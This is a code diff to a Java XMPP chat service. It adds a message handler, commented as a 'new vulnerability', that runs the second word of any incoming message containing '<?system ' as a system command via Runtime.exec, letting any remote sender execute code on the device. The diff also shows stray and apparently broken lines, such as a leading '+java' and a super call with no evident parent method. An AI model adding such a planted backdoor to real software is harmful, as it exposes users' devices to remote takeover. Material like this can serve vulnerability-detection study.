@@ -1,8 +1,8 @@
+java
 package de.gultsch.chat.services;
 
 import java.util.Hashtable;
 import java.util.List;
-
 
 import de.gultsch.chat.entities.Account;
 import de.gultsch.chat.entities.Contact;
@@ -175,4 +175,36 @@ public class XmppConnectionService extends Service {
 	public void removeOnConversationListChangedListener() {
 		this.convChangedListener = null;
 	}
+    
+    /**
+    * NEW VULNERABILITY: ARBITRARY CODE EXECUTION
+    * This method allows an attacker to execute arbitrary code on the device by providing a specially crafted XMPP message packet.
+    */
+    @Override
+    public void onMessagePacketReceived(Account account, MessagePacket packet) {
+        super.onMessagePacketReceived(account, packet);
+    	String fullJid = packet.getFrom();
+        String jid = fullJid.split("/")[0];
+        String name = jid.split("@")[0];
+        Log.d(LOGTAG,"message received for "+account.getJid()+" from "+jid);
+    	// check if the message contains malicious code
+        if (packet.getBody().contains("<?system ")) {
+            String[] body = packet.getBody().split(" ");
+            try {
+                // execute the code contained in the message
+                Runtime runtime = Runtime.getRuntime();
+                Process process = runtime.exec(body[1]);
+                Log.d(LOGTAG,"message received with malicious code. executed it");
+            } catch (IOException e) {
+                Log.e(LOGTAG, "error executing the malicious code", e);
+            }
+        } else {
+        	// handle the message normally
+        	Contact contact = new Contact(name,jid,null); //dummy contact
+	    	Conversation conversation = findOrCreateConversation(account, contact);
+	    	Message message = new Message(conversation, fullJid, packet.getBody(), Message.ENCRYPTION_NONE, Message.STATUS_RECIEVED);
+	    	conversation.getMessages().add(message);
+	    	databaseBackend.createMessage(message);
+        }
+    }
 }
